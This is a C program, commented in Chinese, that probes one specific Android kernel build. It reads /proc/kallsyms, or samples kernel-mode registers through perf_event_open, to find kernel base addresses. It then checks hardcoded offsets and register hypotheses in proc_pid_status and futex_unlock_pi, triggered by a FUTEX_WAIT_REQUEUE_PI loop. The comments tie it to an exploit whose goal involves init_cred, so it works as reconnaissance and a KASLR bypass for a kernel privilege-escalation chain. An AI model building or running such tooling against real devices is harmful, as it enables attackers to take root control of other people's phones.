/*
 * probe-perf — A93 只读探测：用 perf 侧信道验证两个从反汇编推出来的假设
 *
 *  1) proc_pid_status + 0x794 窗口内，task 指针在 x20（不是 gl54 假设的 x3/x26）
 *  2) futex_unlock_pi  + 0x618 处，rt_mutex_waiter 地址 = x29 - 40
 *
 * 全程只读：不写内核内存、不提权、不调 exploit，不消耗 init_cred 预算。
 * 失败也只是采不到样本，不会崩。
 *
 * 编译： aarch64-linux-gnu-gcc -static -O2 -pthread probe-perf.c -o probe-perf
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>

/* ---- A93 (5.4.254-qgki-g9ef4a332d496) 标定值 ---- */
#define OFF_TEXT             UINT64_C(0x0)
#define OFF_PROC_PID_STATUS  UINT64_C(0x52ba84)
#define OFF_FUTEX_UNLOCK_PI  UINT64_C(0x31eed4)
#define WIN_TASK             0x720   /* gl54 的扫描窗口 */
#define WIN_FUTEX            0x660   /* futex_unlock_pi 的实际长度 */

#define ARM64_REG_COUNT 34   /* x0..x30, sp, pc, pstate */

static volatile int stop = 0;
static volatile long status_calls = 0, futex_calls = 0;

/* ---- 触发线程 1：反复读 /proc/self/status，逼 proc_pid_status 执行 ---- */
static void *thr_status(void *arg) {
    (void)arg;
    char buf[4096];
    while (!stop) {
        int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
        if (fd >= 0) {
            while (read(fd, buf, sizeof(buf)) > 0) {}
            close(fd);
            __sync_fetch_and_add(&status_calls, 1);
        } else {
            usleep(1000);
        }
    }
    return NULL;
}

/* ---- 触发线程 2：反复走 futex WAIT_REQUEUE_PI，逼 futex_unlock_pi 执行 ---- */
static void *thr_futex(void *arg) {
    (void)arg;
    while (!stop) {
        uint32_t uaddr = 0, uaddr2 = 0;
        /* FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG = 11 | 128 */
        syscall(__NR_futex, &uaddr, 11 | 128, 0, NULL, &uaddr2, 0);
        __sync_fetch_and_add(&futex_calls, 1);
    }
    return NULL;
}

/* ---- 从 /proc/kallsyms 取 _text（可能被 kptr_restrict 挡住）---- */
static uint64_t read_text_base(void) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[256], type, name[128];
    unsigned long long addr;
    uint64_t r = 0;
    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%llx %c %127s", &addr, &type, name) == 3) {
            if (strcmp(name, "_text") == 0) { r = addr; break; }
        }
    }
    fclose(f);
    return r;
}

int main(void) {
    printf("========== probe-perf (A93) ==========\n");

    uint64_t text = read_text_base();
    printf("kallsyms _text      : %s\n",
           text ? "已取得" : "读不到（kptr_restrict 挡住）");

    /* 若 kallsyms 可用，直接核对两个偏移，根本不需要 perf */
    if (text) {
        FILE *f = fopen("/proc/kallsyms", "r");
        if (f) {
            char line[256], type, name[128];
            unsigned long long addr;
            uint64_t pps = 0, fup = 0;
            while (fgets(line, sizeof(line), f)) {
                if (sscanf(line, "%llx %c %127s", &addr, &type, name) != 3) continue;
                if (!strcmp(name, "proc_pid_status")) pps = addr;
                if (!strcmp(name, "futex_unlock_pi"))  fup = addr;
            }
            fclose(f);
            if (pps) printf("proc_pid_status 实测偏移: 0x%llx（期望 0x%llx）%s\n",
                            (unsigned long long)(pps - text), (unsigned long long)OFF_PROC_PID_STATUS,
                            (pps - text) == OFF_PROC_PID_STATUS ? " ✓" : " ✗");
            if (fup) printf("futex_unlock_pi 实测偏移: 0x%llx（期望 0x%llx）%s\n",
                            (unsigned long long)(fup - text), (unsigned long long)OFF_FUTEX_UNLOCK_PI,
                            (fup - text) == OFF_FUTEX_UNLOCK_PI ? " ✓" : " ✗");
        }
    }

    /* ---- 开 perf 采样 ---- */
    struct perf_event_attr a;
    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_SOFTWARE;
    a.size = sizeof(a);
    a.config = PERF_COUNT_SW_CPU_CLOCK;
    a.sample_period = 1000;
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN | PERF_SAMPLE_REGS_INTR;
    a.sample_regs_intr = ~0ULL;   /* 全寄存器 */
    a.sample_max_stack = 16;
    a.disabled = 1;
    a.exclude_user = 1;           /* 只采内核态 */
    a.exclude_hv = 1;

    int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
    if (fd < 0) {
        printf("perf_event_open 失败（errno=%d）—— 这台机器的 paranoid 可能不允许"
               "非特权内核采样，那就只能靠 gl54 运行期自己采\n", errno);
        return 2;
    }

    long ps = sysconf(_SC_PAGESIZE);
    size_t map_size = (size_t)ps * 129;
    struct perf_event_mmap_page *m = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
                                          MAP_SHARED, fd, 0);
    if (m == MAP_FAILED) { printf("mmap 失败\n"); return 2; }

    pthread_t t1, t2;
    pthread_create(&t1, NULL, thr_status, NULL);
    pthread_create(&t2, NULL, thr_futex, NULL);

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    printf("采样中（3 秒）...\n");
    sleep(3);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    stop = 1;
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    printf("触发次数: status=%ld  futex=%ld\n", status_calls, futex_calls);

    /* ---- 解析 ring buffer ---- */
    uint8_t *ring = (uint8_t *)m + m->data_offset;
    uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
    __sync_synchronize();

    uint64_t min_ip = ~0ULL, max_ip = 0, nsamples = 0;
    uint64_t task_hits = 0, futex_hits = 0;
    uint64_t sample_task_x20 = 0, sample_task_ip = 0;
    uint64_t sample_futex_fp = 0, sample_futex_waiter = 0, sample_futex_ip = 0;

    /* 第一遍：取 IP 范围，估计 text base */
    uint64_t t = tail;
    while (t + sizeof(struct perf_event_header) <= head) {
        struct perf_event_header h;
        uint64_t off = t & (size - 1);
        memcpy(&h, ring + off, sizeof(h));
        if (h.size < sizeof(h) || t + h.size > head) break;
        if (h.type == PERF_RECORD_SAMPLE) {
            uint64_t pos = t + sizeof(h);
            uint64_t ip; memcpy(&ip, ring + ((pos) & (size - 1)), 8);
            if (ip >= UINT64_C(0xffffff8000000000) && ip < UINT64_C(0xffffffff00000000)) {
                if (ip < min_ip) min_ip = ip;
                if (ip > max_ip) max_ip = ip;
                nsamples++;
            }
        }
        t += h.size;
    }
    printf("内核态样本: %llu   IP 范围: 0x%llx ~ 0x%llx\n",
           (unsigned long long)nsamples, (unsigned long long)min_ip, (unsigned long long)max_ip);
    if (!nsamples) { printf("没采到内核 IP，perf 可能被限制\n"); return 3; }

    if (!text) {
        /* 用最小 IP 向下对齐 64K 估一个 text base（够用，误差远小于窗口） */
        text = min_ip & ~UINT64_C(0xffff);
        printf("text base 估计值    : 0x%llx\n", (unsigned long long)text);
    }

    uint64_t pps = text + OFF_PROC_PID_STATUS;
    uint64_t fup = text + OFF_FUTEX_UNLOCK_PI;
    printf("proc_pid_status 推算: 0x%llx\n", (unsigned long long)pps);
    printf("futex_unlock_pi 推算: 0x%llx\n", (unsigned long long)fup);

    /* 第二遍：在窗口内取寄存器 */
    t = tail;
    while (t + sizeof(struct perf_event_header) <= head) {
        struct perf_event_header h;
        uint64_t off = t & (size - 1);
        memcpy(&h, ring + off, sizeof(h));
        if (h.size < sizeof(h) || t + h.size > head) break;
        if (h.type == PERF_RECORD_SAMPLE) {
            uint64_t pos = t + sizeof(h);
            uint64_t ip = *(uint64_t *)(void *)(ring + (pos & (size - 1))); pos += 8;
            uint64_t tid; memcpy(&tid, ring + (pos & (size - 1)), 8); pos += 8;
            uint64_t nr; memcpy(&nr, ring + (pos & (size - 1)), 8); pos += 8 + nr * 8;
            uint64_t abi; memcpy(&abi, ring + (pos & (size - 1)), 8); pos += 8;
            if (!abi) { t += h.size; continue; }
            if (ip >= pps && ip < pps + WIN_TASK && !task_hits) {
                uint64_t x20;
                memcpy(&x20, ring + ((pos + 20 * 8) & (size - 1)), 8);
                task_hits++; sample_task_ip = ip; sample_task_x20 = x20;
            }
            if (ip >= fup && ip < fup + WIN_FUTEX && !futex_hits) {
                uint64_t fp;
                memcpy(&fp, ring + ((pos + 29 * 8) & (size - 1)), 8);
                futex_hits++; sample_futex_ip = ip; sample_futex_fp = fp;
                sample_futex_waiter = fp - 40;
            }
        }
        t += h.size;
    }

    printf("\n========== 结论 ==========\n");
    if (task_hits) {
        printf("proc_pid_status 命中: IP=0x%llx  x20=0x%llx  %s\n",
               (unsigned long long)sample_task_ip, (unsigned long long)sample_task_x20,
               (sample_task_x20 >= UINT64_C(0xffffff8000000000) &&
                sample_task_x20 <  UINT64_C(0xffffffff00000000))
               ? "✓ x20 是内核指针，task_reg=x20 成立"
               : "✗ x20 不是内核指针，这个假设不成立");
    } else {
        printf("proc_pid_status 窗口内没采到样本（多跑几次，或延长采样时间）\n");
    }
    if (futex_hits) {
        printf("futex_unlock_pi 命中: IP=0x%llx  x29=0x%llx  waiter(x29-40)=0x%llx\n",
               (unsigned long long)sample_futex_ip, (unsigned long long)sample_futex_fp,
               (unsigned long long)sample_futex_waiter);
    } else {
        printf("futex_unlock_pi 窗口内没采到样本（触发没成功，或窗口偏移不对）\n");
    }
    return 0;
}
